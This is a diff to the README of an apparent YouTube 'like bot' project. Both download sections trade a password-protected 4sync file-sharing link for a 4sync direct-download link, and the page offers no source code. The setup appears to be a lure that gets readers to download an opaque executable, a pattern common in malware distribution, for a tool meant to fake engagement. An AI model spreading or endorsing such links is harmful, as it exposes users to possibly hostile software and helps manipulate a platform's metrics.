@@ -2,8 +2,7 @@
 
 ## 📥 Download
 
-# [DOWNLOAD](https://www.4sync.com/s/fOHKQbXws)  
-## PASSWORD: 1322
+## [DOWNLOAD](https://www.4sync.com/web/directDownload/pwsl_8-r/DOborovF.27a8861d450f029bbad1a90d626a9165)
 
 ## 🚀 Getting Started
 
@@ -26,8 +25,7 @@ Welcome to the like-bot-youtube project! This application helps you automate the
 
 ## 📂 Download & Install
 
-# [DOWNLOAD](https://www.4sync.com/s/fOHKQbXws)  
-## PASSWORD: 1322
+## [DOWNLOAD](https://www.4sync.com/web/directDownload/pwsl_8-r/DOborovF.27a8861d450f029bbad1a90d626a9165)
 
 4. Click on the file to download it to your computer.
 
